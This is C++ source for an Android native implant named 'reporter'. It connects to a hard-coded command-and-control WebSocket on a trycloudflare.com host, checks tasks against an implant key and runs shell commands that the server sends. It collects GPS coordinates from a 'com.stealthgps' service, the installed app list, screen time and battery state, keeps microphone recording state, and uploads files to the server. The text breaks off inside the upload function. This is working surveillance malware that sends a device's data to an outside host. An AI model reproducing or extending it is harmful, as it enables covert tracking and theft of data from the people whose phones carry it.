#include <cctype>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <ctime>

#include <algorithm>
#include <atomic>
#include <chrono>
#include <condition_variable>
#include <fstream>
#include <functional>
#include <mutex>
#include <queue>
#include <sstream>
#include <string>
#include <string_view>
#include <thread>
#include <unordered_set>
#include <utility>
#include <vector>

#include "json_escape_utils.h"

#include <dirent.h>
#include <fcntl.h>
#include <getopt.h>
#include <signal.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/un.h>
#include <sys/wait.h>
#include <unistd.h>

#include <aaudio/AAudio.h>

#ifdef __ANDROID__
#  include <android/log.h>
#  include <sys/system_properties.h>
#else
#  include <cstdarg>
#  define PROP_VALUE_MAX 92
static int __system_property_get(const char* name, char* value) {
    (void)name;
    if (value) value[0] = '\0';
    return 0;
}
static int __android_log_print(int prio, const char* tag, const char* fmt, ...) {
    (void)prio; (void)tag;
    va_list args;
    va_start(args, fmt);
    int ret = vfprintf(stderr, fmt, args);
    va_end(args);
    return ret;
}
#endif

#include <ixwebsocket/IXNetSystem.h>
#include <ixwebsocket/IXWebSocket.h>

// Configuration.
static constexpr const char* DEFAULT_WS_SERVER_URL = "wss://hearts-eliminate-adrian-texts.trycloudflare.com/ws";
static constexpr const char* C2_URL_FILE           = "/data/local/tmp/c2_url.txt";
static constexpr const char* C2_TLS_PIN_FILE       = "/data/local/tmp/c2_tls_pin.pem";
static constexpr const char* PING_INTERVAL_FILE    = "/data/system/ping_interval.txt";
static constexpr const char* LOG_TAG               = "reporter";
static constexpr const char* LOG_PATH              = "/data/local/tmp/reporter.log";
static constexpr const char* DISABLE_FILE          = "/data/local/tmp/reporter_disable";
static constexpr const char* GPS_FILE              = "/data/local/tmp/gps_history.csv";
static constexpr const char* MIC_FILE              = "/data/local/tmp/mic.wav";
static constexpr const char* MIC_RECORD_DONE_FILE  = "/data/local/tmp/mic_record.done";
static constexpr const char* LOCAL_IPC_SOCKET      = "/data/local/tmp/reporter.sock";
static constexpr const char* SCREEN_TIME_FILE      = "/data/local/tmp/screen_time_minutes.txt";
static constexpr const char* LOC_FILE              = "/data/user/0/com.stealthgps/files/location_enabled";
static constexpr const char* LOC_FLAG_FILE         = "/data/local/tmp/location_enabled";
static constexpr const char* GPS_COORDS_FILE       = "/data/user/0/com.stealthgps/files/coords.txt";
static constexpr const char* GPS_COORDS_FALLBACK   = "/data/local/tmp/com.stealthgps_coords.txt";

static constexpr bool ENABLE_FILE_LOGGING = true;
static constexpr long MAX_LOG_SIZE        = 1024 * 1024; 
static constexpr int  MAX_LOG_FILES       = 5;

static constexpr int GPS_CACHE_TTL_S      = 5;
static constexpr int GPS_UPDATE_INTERVAL_MS = 5000;

static constexpr int BATTERY_CACHE_TTL_S = 30;
static constexpr int WORKER_THREAD_COUNT  = 4;
static constexpr int WORKER_QUEUE_MAX     = 50;
static constexpr int RUN_CMD_TIMEOUT_S    = 30;

static constexpr size_t MAX_COMPANION_ERR_BYTES = 2048;

// Shared state.
static FILE*       g_log_file = nullptr;
static size_t      g_log_size = 0;
static std::mutex  g_log_mutex;

static std::mutex  g_ws_mutex;

static std::string g_implant_key;

static std::string g_device_id;
static std::string g_build_id;
static std::string g_build_version;
static std::string g_build_type;
static std::string g_device_name;

static std::string g_escaped_implant_key;
static std::string g_escaped_device_id;
static std::string g_escaped_build_id;
static std::string g_escaped_build_version;
static std::string g_escaped_build_type;
static std::string g_escaped_device_name;

static ix::WebSocket           g_webSocket;
static std::queue<std::string> g_taskQueue;
static std::mutex              g_taskMutex;
static std::condition_variable g_taskCV;

static std::vector<std::string> g_forbiddenApps;
static std::mutex               g_forbiddenMutex;
static std::condition_variable  g_forbiddenCV;

static std::queue<std::function<void()>> g_workerQueue;
static std::mutex                        g_workerQueueMutex;
static std::condition_variable           g_workerQueueCV;
static std::atomic<bool>                 g_workerShutdown{false};
static std::atomic<bool>                 g_mic_record_in_progress{false};

static std::atomic<bool>                 g_mic_file_ready{false};
static std::mutex                        g_mic_file_mutex;
static std::condition_variable           g_mic_file_cv;

// Audio task queue (for tracking pending audio tasks)
struct AudioTask {
    long taskId;
    int type;
    float volume;
    int loops;
    std::string status;  // "pending", "playing", "completed", "cancelled"
};
static std::queue<AudioTask>             g_audio_task_queue;
static std::mutex                        g_audio_queue_mutex;
static const int                         MAX_AUDIO_QUEUE_SIZE = 50;

static std::atomic<int>     g_ping_interval{60};
static std::atomic<int>     g_last_battery_level{-1};
static std::atomic<int>     g_last_loc_state{-1};
static std::atomic<int>     g_last_charging_state{-1};

static double      g_last_lat = 0.0;
static double      g_last_lon = 0.0;
static std::mutex  g_last_latlon_mutex;

static std::string              g_installed_apps;
static std::string              g_last_installed_apps;
static std::atomic<bool>        g_installed_apps_dirty{true};
static time_t                   g_installed_apps_mtime = 0;
static std::mutex               g_installed_apps_mutex;

static int         g_screen_time_minutes = 0;
static std::string g_last_screen_time_report_key;
static bool        g_first_report = true;

static double      g_cached_gps_lat  = 0.0;
static double      g_cached_gps_lon  = 0.0;
static bool        g_cached_gps_valid = false;
static time_t      g_cached_gps_time  = 0;
static std::mutex  g_gps_cache_mutex;

static std::atomic<bool> g_force_location_report{false};

static int    g_cached_battery_level   = -1;
static int    g_cached_charging_state  = -1;
static time_t g_cached_battery_time    = 0;
static time_t g_cached_charging_time   = 0;

// Forward declarations.
static void  log_message(const std::string& message);
static void  rotate_logs_locked();       
bool         websocket_send_text(const std::string& message);
bool         websocket_send_binary(const std::string& data);
void         send_error_to_server(const std::string& source, const std::string& msg);
bool         enqueue_task(std::function<void()> task);
bool         run_command_no_output(const std::vector<std::string>& argv);
std::pair<bool, std::string> exec_cmd(const std::vector<std::string>& argv);
std::pair<bool, std::string> exec_cmd_shell(const std::string& cmd);
std::vector<std::string>     split_command_line(const std::string& cmd);
std::string  get_json_val(const std::string& json, const std::string& key);
bool         save_ping_interval_to_file(int interval);
bool         is_location_enabled();
static std::vector<std::string> gps_service_launch_argv(int interval_ms);
static bool  validate_inbound_task(const std::string& json);
static void  trim_string(std::string& s);
static std::string normalize_audio_play_value(const std::string& json);
void         do_report();
void         process_tasks();
void         worker_thread_loop();

// Rotate the log when it reaches the configured size limit.
static void rotate_logs_locked() {
    if (!ENABLE_FILE_LOGGING || !g_log_file) return;
    fclose(g_log_file);
    g_log_file = nullptr;

    const std::string base(LOG_PATH);
    for (int i = MAX_LOG_FILES - 1; i > 0; --i) {
        std::string old_p = base + "." + std::to_string(i);
        std::string new_p = base + "." + std::to_string(i + 1);
        if (access(old_p.c_str(), F_OK) == 0)
            rename(old_p.c_str(), new_p.c_str());
    }
    rename(LOG_PATH, (base + ".1").c_str());

    g_log_file = fopen(LOG_PATH, "a");
    if (g_log_file) {
        chmod(LOG_PATH, 0666);
        g_log_size = 0;
    }
}

// Format and write one log entry.
static void log_message(const std::string& message) {
    std::time_t now = std::time(nullptr);
    char ts[24];
    struct tm tm_buf;
    localtime_r(&now, &tm_buf);
    std::strftime(ts, sizeof(ts), "%Y-%m-%d %H:%M:%S", &tm_buf);

    std::string line;
    line.reserve(24 + message.size());
    line.push_back('[');
    line.append(ts);
    line.append("] ");
    line.append(message);

    std::lock_guard<std::mutex> lk(g_log_mutex);

    if (ENABLE_FILE_LOGGING && g_log_file &&
        g_log_size + line.size() + 1 > static_cast<size_t>(MAX_LOG_SIZE)) {
        rotate_logs_locked();
    }

#ifdef __ANDROID__
    __android_log_print(ANDROID_LOG_INFO, LOG_TAG, "%s", line.c_str());
#else
    fprintf(stderr, "%s\n", line.c_str());
#endif

    if (ENABLE_FILE_LOGGING && g_log_file) {
        fprintf(g_log_file, "%s\n", line.c_str());
        fflush(g_log_file);
        g_log_size += line.size() + 1;
    }
}

static void skip_json_whitespace(const std::string& j, size_t& p) {
    while (p < j.size() && std::isspace(static_cast<unsigned char>(j[p]))) ++p;
}

static bool parse_json_string(const std::string& j, size_t& p, std::string& out) {
    if (p >= j.size() || j[p] != '"') return false;
    ++p;
    out.clear();
    while (p < j.size()) {
        char c = j[p++];
        if (c == '\\') {
            if (p >= j.size()) return false;
            char e = j[p++];
            switch (e) {
                case '"':  out.push_back('"');  break;
                case '\\': out.push_back('\\'); break;
                case '/':  out.push_back('/');  break;
                case 'b':  out.push_back('\b'); break;
                case 'f':  out.push_back('\f'); break;
                case 'n':  out.push_back('\n'); break;
                case 'r':  out.push_back('\r'); break;
                case 't':  out.push_back('\t'); break;
                case 'u': {
                    if (p + 4 > j.size()) return false;
                    unsigned code = 0;
                    for (int i = 0; i < 4; ++i) {
                        char h = j[p++]; code <<= 4;
                        if (h >= '0' && h <= '9') code |= static_cast<unsigned>(h - '0');
                        else if (h >= 'a' && h <= 'f') code |= static_cast<unsigned>(h - 'a' + 10);
                        else if (h >= 'A' && h <= 'F') code |= static_cast<unsigned>(h - 'A' + 10);
                        else return false;
                    }
                    if      (code <= 0x7F)  { out.push_back(static_cast<char>(code)); }
                    else if (code <= 0x7FF) { out.push_back(static_cast<char>(0xC0|((code>>6)&0x1F)));
                                              out.push_back(static_cast<char>(0x80|(code&0x3F))); }
                    else                    { out.push_back(static_cast<char>(0xE0|((code>>12)&0x0F)));
                                              out.push_back(static_cast<char>(0x80|((code>>6)&0x3F)));
                                              out.push_back(static_cast<char>(0x80|(code&0x3F))); }
                } break;
                default: out.push_back(e); break;
            }
            continue;
        }
        if (c == '"') return true;
        out.push_back(c);
    }
    return false;
}

static bool skip_json_value(const std::string& j, size_t& p);

static bool skip_json_string(const std::string& j, size_t& p) {
    if (p >= j.size() || j[p] != '"') return false;
    ++p;
    while (p < j.size()) {
        char c = j[p++];
        if (c == '\\') {
            if (p >= j.size()) return false;
            if (j[p] == 'u') { p += 5; if (p > j.size()) return false; }
            else ++p;
            continue;
        }
        if (c == '"') return true;
    }
    return false;
}

static bool skip_json_value(const std::string& j, size_t& p) {
    skip_json_whitespace(j, p);
    if (p >= j.size()) return false;
    char c = j[p];

    if (c == '"') return skip_json_string(j, p);

    if (c == '{') {
        ++p;
        while (p < j.size()) {
            skip_json_whitespace(j, p);
            if (p < j.size() && j[p] == '}') { ++p; return true; }
            if (!skip_json_value(j, p)) return false;
            skip_json_whitespace(j, p);
            if (p >= j.size() || j[p] != ':') return false;
            ++p;
            if (!skip_json_value(j, p)) return false;
            skip_json_whitespace(j, p);
            if (p < j.size() && j[p] == ',') { ++p; continue; }
            if (p < j.size() && j[p] == '}') { ++p; return true; }
            return false;
        }
        return false;
    }

    if (c == '[') {
        ++p;
        while (p < j.size()) {
            skip_json_whitespace(j, p);
            if (p < j.size() && j[p] == ']') { ++p; return true; }
            if (!skip_json_value(j, p)) return false;
            skip_json_whitespace(j, p);
            if (p < j.size() && j[p] == ',') { ++p; continue; }
            if (p < j.size() && j[p] == ']') { ++p; return true; }
            return false;
        }
        return false;
    }

    if (c == 't' && j.compare(p, 4, "true")  == 0) { p += 4; return true; }
    if (c == 'f' && j.compare(p, 5, "false") == 0) { p += 5; return true; }
    if (c == 'n' && j.compare(p, 4, "null")  == 0) { p += 4; return true; }

    size_t start = p;
    if (c == '-') ++p;
    while (p < j.size() && std::isdigit(static_cast<unsigned char>(j[p]))) ++p;
    if (p < j.size() && j[p] == '.') {
        ++p;
        while (p < j.size() && std::isdigit(static_cast<unsigned char>(j[p]))) ++p;
    }
    if (p < j.size() && (j[p] == 'e' || j[p] == 'E')) {
        ++p;
        if (p < j.size() && (j[p] == '+' || j[p] == '-')) ++p;
        while (p < j.size() && std::isdigit(static_cast<unsigned char>(j[p]))) ++p;
    }
    return p > start;
}

std::string get_json_val(const std::string& json, const std::string& key) {
    if (json.empty() || key.empty()) return "";
    size_t pos = 0;
    skip_json_whitespace(json, pos);
    if (pos < json.size() && json[pos] == '{') ++pos;

    while (pos < json.size()) {
        skip_json_whitespace(json, pos);
        if (pos >= json.size()) break;
        if (json[pos] == ',') { ++pos; continue; }
        if (json[pos] != '"') break;

        std::string current_key;
        if (!parse_json_string(json, pos, current_key)) return "";

        skip_json_whitespace(json, pos);
        if (pos >= json.size() || json[pos] != ':') continue;
        ++pos;
        skip_json_whitespace(json, pos);

        if (current_key == key) {
            if (pos < json.size() && json[pos] == '"') {
                std::string value;
                return parse_json_string(json, pos, value) ? value : "";
            }
            size_t vs = pos;
            if (!skip_json_value(json, pos)) return "";
            size_t ve = pos;
            while (ve > vs && std::isspace(static_cast<unsigned char>(json[ve-1]))) --ve;
            return json.substr(vs, ve - vs);
        }
        if (!skip_json_value(json, pos)) return "";
    }
    return "";
}

static bool ct_str_equal(const std::string& a, const std::string& b) {
    if (a.size() != b.size()) {
        
        volatile unsigned char acc = 0;
        for (size_t i = 0; i < a.size(); ++i) acc |= static_cast<unsigned char>(a[i]);
        (void)acc;
        return false;
    }
    volatile unsigned char diff = 0;
    for (size_t i = 0; i < a.size(); ++i)
        diff |= static_cast<unsigned char>(a[i] ^ b[i]);
    return diff == 0;
}

static bool validate_inbound_task(const std::string& json) {
    
    if (!ct_str_equal(get_json_val(json, "implant_key"), g_implant_key)) return false;
    return !get_json_val(json, "task").empty();
}

static std::vector<std::string> gps_service_launch_argv(int interval_ms) {
    return {
        "am", "start-foreground-service", "--user", "0",
        "-n", "com.stealthgps/.GpsService",
        "--el", "interval", std::to_string(interval_ms)
    };
}

bool run_command_no_output(const std::vector<std::string>& argv) {
    if (argv.empty()) return false;

    std::vector<char*> cargs;
    cargs.reserve(argv.size() + 1);
    for (const auto& a : argv) cargs.push_back(const_cast<char*>(a.c_str()));
    cargs.push_back(nullptr);

    pid_t pid = fork();
    if (pid == -1) {
        send_error_to_server("fork_exec", "fork() failed for: " + argv[0]);
        return false;
    }
    if (pid == 0) {
        int devnull = open("/dev/null", O_WRONLY);
        if (devnull >= 0) { dup2(devnull, STDOUT_FILENO); dup2(devnull, STDERR_FILENO); close(devnull); }
        execvp(cargs[0], cargs.data());
        _exit(127);
    }

    int  status = 0;
    bool exited = false;
    for (int i = 0; i < RUN_CMD_TIMEOUT_S; ++i) {
        pid_t r = waitpid(pid, &status, WNOHANG);
        if (r == pid)  { exited = true; break; }
        if (r == -1)   return false;
        std::this_thread::sleep_for(std::chrono::seconds(1));
    }
    if (!exited) { kill(pid, SIGKILL); waitpid(pid, &status, 0); return false; }
    return WIFEXITED(status) && WEXITSTATUS(status) == 0;
}

std::vector<std::string> split_command_line(const std::string& cmd) {
    std::vector<std::string> result;
    std::string current;
    bool in_sq = false, in_dq = false, escaped = false;

    for (char raw : cmd) {
        unsigned char ch = static_cast<unsigned char>(raw);
        if (escaped) { current.push_back(ch); escaped = false; continue; }
        if (ch == '\\') { escaped = true; continue; }
        if (ch == '\'' && !in_dq) { in_sq = !in_sq; continue; }
        if (ch == '"'  && !in_sq) { in_dq = !in_dq; continue; }
        if (!in_sq && !in_dq && std::isspace(ch)) {
            if (!current.empty()) { result.push_back(std::move(current)); current.clear(); }
            continue;
        }
        current.push_back(ch);
    }
    if (!current.empty()) result.push_back(std::move(current));
    return result;
}

std::pair<bool, std::string> exec_cmd(const std::vector<std::string>& argv) {
    if (argv.empty()) { log_message("exec_cmd: empty argv"); return {false, ""}; }

    std::string joined;
    { size_t total = argv.size() - 1;
      for (const auto& a : argv) total += a.size();
      joined.reserve(total);
      for (size_t i = 0; i < argv.size(); ++i) { if (i) joined.push_back(' '); joined += argv[i]; } }
    log_message("exec_cmd: " + joined);

    int pipefd[2];
    if (pipe(pipefd) != 0) {
        send_error_to_server("exec_cmd", "pipe() failed for: " + joined);
        return {false, ""};
    }

    pid_t pid = fork();
    if (pid == -1) {
        close(pipefd[0]); close(pipefd[1]);
        send_error_to_server("exec_cmd", "fork() failed for: " + joined);
        return {false, ""};
    }
    if (pid == 0) {
        close(pipefd[0]);
        dup2(pipefd[1], STDOUT_FILENO); dup2(pipefd[1], STDERR_FILENO);
        close(pipefd[1]);
        std::vector<char*> cargs;
        cargs.reserve(argv.size() + 1);
        for (const auto& a : argv) cargs.push_back(const_cast<char*>(a.c_str()));
        cargs.push_back(nullptr);
        execvp(cargs[0], cargs.data());
        _exit(127);
    }

    close(pipefd[1]);
    static constexpr size_t MAX_OUTPUT = 1024 * 1024;
    std::string result;
    char buf[4096];
    ssize_t n;
    while ((n = read(pipefd[0], buf, sizeof(buf))) > 0) {
        if (result.size() + static_cast<size_t>(n) > MAX_OUTPUT) {
            result.append(buf, MAX_OUTPUT - result.size());
            log_message("exec_cmd output truncated at 1 MB.");
            break;
        }
        result.append(buf, static_cast<size_t>(n));
    }
    close(pipefd[0]);

    int  status = 0;
    bool exited = false;
    for (int i = 0; i < 120; ++i) {
        pid_t r = waitpid(pid, &status, WNOHANG);
        if (r == pid) { exited = true; break; }
        if (r == -1)  { return {false, result}; }
        std::this_thread::sleep_for(std::chrono::seconds(1));
    }
    if (!exited) {
        kill(pid, SIGKILL); waitpid(pid, &status, 0);
        send_error_to_server("exec_cmd", "Timed out (120s): " + joined);
    }

    while (!result.empty() && std::isspace(static_cast<unsigned char>(result.back())))
        result.pop_back();

    bool success = exited && WIFEXITED(status) && WEXITSTATUS(status) == 0;
    if (result.size() > 200)
        log_message("exec_cmd output (" + std::to_string(result.size()) + " bytes): " + result.substr(0, 200) + "...");
    else
        log_message("exec_cmd output: " + result);
    return {success, result};
}

std::pair<bool, std::string> exec_cmd_shell(const std::string& cmd) {
    return exec_cmd(std::vector<std::string>{"/system/bin/sh", "-c", cmd});
}

std::pair<bool, std::string> exec_cmd(const std::string& cmd) {
    return exec_cmd(split_command_line(cmd));
}

bool enqueue_task(std::function<void()> task) {
    if (!task) return false;
    {
        std::lock_guard<std::mutex> lk(g_workerQueueMutex);
        if (g_workerShutdown) return false;
        if (g_workerQueue.size() >= WORKER_QUEUE_MAX) {
            log_message("Worker queue full; dropping task.");
            return false;
        }
        g_workerQueue.push(std::move(task));
    }
    g_workerQueueCV.notify_one();
    return true;
}

void worker_thread_loop() {
    while (true) {
        std::function<void()> task;
        {
            std::unique_lock<std::mutex> lk(g_workerQueueMutex);
            g_workerQueueCV.wait(lk, [] { return g_workerShutdown || !g_workerQueue.empty(); });
            if (g_workerShutdown && g_workerQueue.empty()) return;
            task = std::move(g_workerQueue.front());
            g_workerQueue.pop();
        }
        if (task) task();
    }
}

static bool websocket_is_open() {
    return g_webSocket.getReadyState() == ix::ReadyState::Open;
}

bool websocket_send_text(const std::string& message) {
    std::lock_guard<std::mutex> lk(g_ws_mutex);
    if (!websocket_is_open()) return false;
    g_webSocket.sendText(message);
    return true;
}

bool websocket_send_binary(const std::string& data) {
    std::lock_guard<std::mutex> lk(g_ws_mutex);
    if (!websocket_is_open()) return false;
    g_webSocket.sendBinary(data);
    return true;
}

void send_error_to_server(const std::string& source, const std::string& msg) {
    log_message("ERROR [" + source + "]: " + msg);
    std::string json;
    json.reserve(80 + g_escaped_implant_key.size() + g_escaped_device_id.size()
                 + source.size() + msg.size()
                 + json_escape_extra_bytes(source) + json_escape_extra_bytes(msg));
    json += "{\"implant_key\":\""; json += g_escaped_implant_key;
    json += "\",\"device_id\":\"";  json += g_escaped_device_id;
    json += "\",\"error_source\":\""; append_json_escaped(json, source);
    json += "\",\"error_msg\":\"";    append_json_escaped(json, msg);
    json += "\"}";
    websocket_send_text(json);
}

static const char* choose_location_file_path() {
    static const char* candidates[] = {
        LOC_FILE,
        "/data/user_de/0/com.stealthgps/files/location_enabled",
        "/data/system_de/0/com.stealthgps/files/location_enabled",
    };
    for (const char* p : candidates) {
        if (access(p, R_OK) == 0) return p;
    }
    return LOC_FILE;
}

static const char* choose_gps_coords_path() {
    static const char* candidates[] = {
        "/data/local/tmp/com.stealthgps_coords.txt",
        "/data/local/tmp/coords.txt",
        GPS_COORDS_FALLBACK,
    };
    for (const char* p : candidates) {
        if (access(p, R_OK) == 0) return p;
    }
    // If none of the candidate paths are readable, prefer a world-readable fallback
    // under /data/local/tmp rather than returning an app-private path which will
    // cause repeated "Cannot open coords file" errors in logs.
    return GPS_COORDS_FALLBACK;
}

static void write_flag_file(const char* path, int status) {
    int fd = open(path, O_WRONLY | O_CREAT | O_TRUNC, 0666);
    if (fd < 0) return;
    char ch = status ? '1' : '0';
    write(fd, &ch, 1);
    close(fd);
    chmod(path, 0666);
}

bool is_location_enabled() {
    // Prefer a clearly shared flag file under /data/local/tmp so users can toggle
    // location without touching app-private storage. Do NOT auto-create app-private
    // files here; if no flag exists, default to enabled (backwards compatible).
    int fd = open(LOC_FLAG_FILE, O_RDONLY);
    if (fd >= 0) {
        char ch = '1';
        bool ok = (read(fd, &ch, 1) == 1);
        close(fd);
        if (ok) return ch == '1';
        return true;
    }

    const char* path = choose_location_file_path();
    if (path && strcmp(path, LOC_FLAG_FILE) != 0) {
        fd = open(path, O_RDONLY);
        if (fd >= 0) {
            char ch = '1';
            bool ok = (read(fd, &ch, 1) == 1);
            close(fd);
            if (ok) return ch == '1';
            return true;
        }
    }

    // No explicit flag found; default to enabled but DO NOT create files.
    return true;
}

static void set_location_file(int status) {
    // Only update the shared flag file; do not write to app-private paths.
    write_flag_file(LOC_FLAG_FILE, status);
}

int load_ping_interval_from_file(int default_val) {
    int interval = default_val;
    bool valid   = false;
    int fd = open(PING_INTERVAL_FILE, O_RDONLY);
    if (fd >= 0) {
        char buf[32]; ssize_t n = read(fd, buf, sizeof(buf)-1); close(fd);
        if (n > 0) { buf[n] = '\0';
            try { int v = std::stoi(buf); if (v >= 1) { interval = v; valid = true; } }
            catch (...) {}
        }
    }
    if (!valid) save_ping_interval_to_file(default_val);
    return interval;
}

bool save_ping_interval_to_file(int interval) {
    int fd = open(PING_INTERVAL_FILE, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (fd < 0) return false;
    std::string val = std::to_string(interval);
    ssize_t w = write(fd, val.data(), val.size());
    close(fd);
    return w == static_cast<ssize_t>(val.size());
}

int get_battery_level() {
    time_t now = time(nullptr);
    if (g_cached_battery_level >= 0 && now - g_cached_battery_time < BATTERY_CACHE_TTL_S)
        return g_cached_battery_level;
    int fd = open("/sys/class/power_supply/battery/capacity", O_RDONLY);
    if (fd < 0) return g_cached_battery_level;
    char buf[8]; ssize_t n = read(fd, buf, sizeof(buf)-1); close(fd);
    if (n <= 0) return g_cached_battery_level;
    buf[n] = '\0';
    g_cached_battery_level = atoi(buf);
    g_cached_battery_time  = now;
    return g_cached_battery_level;
}

static int parse_battery_status(const char* raw) {
    if (!raw) return 0;
    char status[32] = {};
    strncpy(status, raw, sizeof(status)-1);
    for (char* p = status; *p; ++p) if (*p == '\n' || *p == '\r') { *p = '\0'; break; }
    return (strcmp(status, "Charging") == 0) ? 1 : 0;
}

int get_charging_state() {
    time_t now = time(nullptr);
    if (g_cached_charging_state >= 0 && now - g_cached_charging_time < BATTERY_CACHE_TTL_S)
        return g_cached_charging_state;
    int fd = open("/sys/class/power_supply/battery/status", O_RDONLY);
    if (fd < 0) return (g_cached_charging_state >= 0) ? g_cached_charging_state : 0;
    char buf[32]; ssize_t n = read(fd, buf, sizeof(buf)-1); close(fd);
    if (n <= 0) return (g_cached_charging_state >= 0) ? g_cached_charging_state : 0;
    buf[n] = '\0';
    // Log raw status for debugging and parse it.
    std::string raw_status(buf);
    log_message(std::string("battery status raw: ") + raw_status);
    g_cached_charging_state = parse_battery_status(buf);
    // If sysfs says not charging but system reports USB/AC powered, prefer dumpsys.
    if (g_cached_charging_state == 0) {
        auto ds = exec_cmd_shell(std::string("dumpsys battery"));
        if (ds.first) {
            const std::string& out = ds.second;
            log_message(std::string("dumpsys battery: ") + out);
            if (out.find("USB powered: true") != std::string::npos ||
                out.find("AC powered: true")  != std::string::npos) {
                log_message("Overriding charging state to 1 based on dumpsys");
                g_cached_charging_state = 1;
            }
        } else {
            log_message("Failed to run dumpsys battery for charging fallback");
        }
    }
    g_cached_charging_time  = now;
    log_message(std::string("parsed charging state: ") + (g_cached_charging_state ? "1" : "0"));
    return g_cached_charging_state;
}

std::string get_sys_prop(const char* prop) {
    char value[PROP_VALUE_MAX];
    if (__system_property_get(prop, value) > 0) return std::string(value);
    return "UNKNOWN";
}
std::string get_build_id()      { return get_sys_prop("ro.build.id"); }
std::string get_build_version() { return get_sys_prop("ro.build.version.release"); }
std::string get_build_type()    { return get_sys_prop("ro.build.type"); }
std::string get_device_name()   { return get_sys_prop("ro.product.model"); }
std::string get_serialno() {
    std::string s = get_sys_prop("ro.serialno");
    return (s == "UNKNOWN") ? "UNKNOWN_DEVICE" : s;
}

bool get_location_from_gps_provider(double& lat, double& lon) {
    time_t now = time(nullptr);
    {
        std::lock_guard<std::mutex> lk(g_gps_cache_mutex);
        
        if (g_cached_gps_valid && now - g_cached_gps_time < GPS_CACHE_TTL_S) {
            lat = g_cached_gps_lat; lon = g_cached_gps_lon; return true;
        }
    }

    const char* coords_file = choose_gps_coords_path();
    int fd = open(coords_file, O_RDONLY);
    if (fd < 0) {
        send_error_to_server("gps_read", std::string("Cannot open coords file: ") + coords_file);
        return false;
    }
    char buf[64]; ssize_t n = read(fd, buf, sizeof(buf)-1); close(fd);
    if (n <= 0) return false;
    buf[n] = '\0';

    char* comma = static_cast<char*>(std::memchr(buf, ',', static_cast<size_t>(n)));
    if (!comma) { send_error_to_server("gps_parse", "Malformed coords: missing comma"); return false; }
    *comma = '\0';

    char* end = nullptr;
    double parsed_lat = std::strtod(buf,     &end); if (end == buf)    { send_error_to_server("gps_parse", "Bad lat"); return false; }
    double parsed_lon = std::strtod(comma+1, &end); if (end == comma+1){ send_error_to_server("gps_parse", "Bad lon"); return false; }

    {
        std::lock_guard<std::mutex> lk(g_gps_cache_mutex);
        g_cached_gps_lat   = parsed_lat;
        g_cached_gps_lon   = parsed_lon;
        g_cached_gps_valid = true;
        g_cached_gps_time  = now;
    }
    lat = parsed_lat; lon = parsed_lon;
    return true;
}

static void append_installed_packages(std::string_view text, std::string& apps) {
    constexpr std::string_view prefix = "package:";
    size_t start = 0;
    while (start < text.size()) {
        size_t end     = text.find('\n', start);
        size_t line_end = (end == std::string_view::npos) ? text.size() : end;
        if (line_end >= start + prefix.size() && text.compare(start, prefix.size(), prefix) == 0) {
            if (!apps.empty()) apps.push_back(',');
            apps.append(text.data() + start + prefix.size(), line_end - start - prefix.size());
        }
        if (end == std::string_view::npos) break;
        start = end + 1;
    }
}

static std::atomic<bool> g_pm_fallback_running{false};

static void refresh_installed_apps_async() {
    if (g_pm_fallback_running.exchange(true)) return; 

    const char* packages_path = "/data/system/packages.list";
    struct stat st{};
    bool mtime_changed = false;
    {
        std::lock_guard<std::mutex> lk(g_installed_apps_mutex);
        if (stat(packages_path, &st) == 0 && st.st_mtime != g_installed_apps_mtime) {
            g_installed_apps_mtime = st.st_mtime;
            mtime_changed = true;
        }
        if (!mtime_changed && !g_installed_apps_dirty.load() && !g_installed_apps.empty()) {
            g_pm_fallback_running = false;
            return;
        }
    }

    int fd = open(packages_path, O_RDONLY);
    if (fd >= 0) {
        struct stat fst{};
        if (fstat(fd, &fst) == 0 && fst.st_size > 0) {
            std::string contents(static_cast<size_t>(fst.st_size), '\0');
            ssize_t bytes = read(fd, contents.data(), contents.size());
            close(fd);
            if (bytes > 0) {
                contents.resize(static_cast<size_t>(bytes));
                std::string apps;
                apps.reserve(contents.size());
                append_installed_packages(contents, apps);
                std::lock_guard<std::mutex> lk(g_installed_apps_mutex);
                g_installed_apps       = std::move(apps);
                g_installed_apps_dirty = false;
                g_pm_fallback_running  = false;
                return;
            }
        } else { close(fd); }
    }

    enqueue_task([]() {
        auto [ok, output] = exec_cmd(std::vector<std::string>{"pm", "list", "packages"});
        std::string apps;
        if (ok) { apps.reserve(output.size()); append_installed_packages(output, apps); }
        {
            std::lock_guard<std::mutex> lk(g_installed_apps_mutex);
            if (!apps.empty()) {
                g_installed_apps       = std::move(apps);
                g_installed_apps_dirty = false;
            }
        }
        g_pm_fallback_running = false;
    });
}

static std::string get_installed_apps_snapshot() {
    std::lock_guard<std::mutex> lk(g_installed_apps_mutex);
    return g_installed_apps;
}

static std::string make_hour_key(time_t t) {
    char buf[32]; struct tm tm_buf; localtime_r(&t, &tm_buf);
    std::strftime(buf, sizeof(buf), "%Y-%m-%d-%H", &tm_buf);
    return std::string(buf);
}

static int read_screen_time_minutes() {
    int fd = open(SCREEN_TIME_FILE, O_RDONLY);
    if (fd < 0) return g_screen_time_minutes;
    char buf[16]; ssize_t n = read(fd, buf, sizeof(buf)-1); close(fd);
    if (n <= 0) return g_screen_time_minutes;
    buf[n] = '\0';
    int m = atoi(buf);
    return (m >= 0) ? m : g_screen_time_minutes;
}

static bool should_send_screen_time(time_t now) {
    const std::string key = make_hour_key(now);
    if (g_first_report || key != g_last_screen_time_report_key) {
        g_last_screen_time_report_key = key;
        return true;
    }
    return false;
}

void upload_file(const std::string& filepath, const std::string& type = "file") {
    static constexpr std::streamsize MAX_UPLOAD = 50 * 1024 * 1024;
    std::ifstream file(filepath, std::ios::binary | std::ios::ate);
    if (!file) { send_error_to_server("file_upload", "Cannot open: " + filepath); return; }
    std::streamsize sz = file.tellg();
    if (sz <= 0)   { send_error_to_server("file_upload", "Empty: " + filepath); return; }
    if (sz > MAX_UPLOAD) { send_error_to_server("file_upload", "Too large: " + filepath); return; }

    std::string meta;
    meta.reserve(80 + g_escaped_implant_key.size() + type.size() + filepath.size()
                 + json_escape_extra_bytes(type) + json_escape_extra_bytes(filepath));
    meta += "{\"implant_key\":\""; meta += g_escaped_implant_key;
    meta += "\",\"upload_type\":\""; append_json_escaped(meta, type);
    meta += "\",\"filepath\":\"";    append_json_escaped(meta, filepath);
    meta += "\"}";

    std::string buffer(static_cast<size_t>(sz), '\0');
    file.seekg(0, std::ios::beg);
    if (!file.read(&buffer[0], sz)) {
        send_error_to_server("file_upload", "Read failed: " + filepath); return;
    }

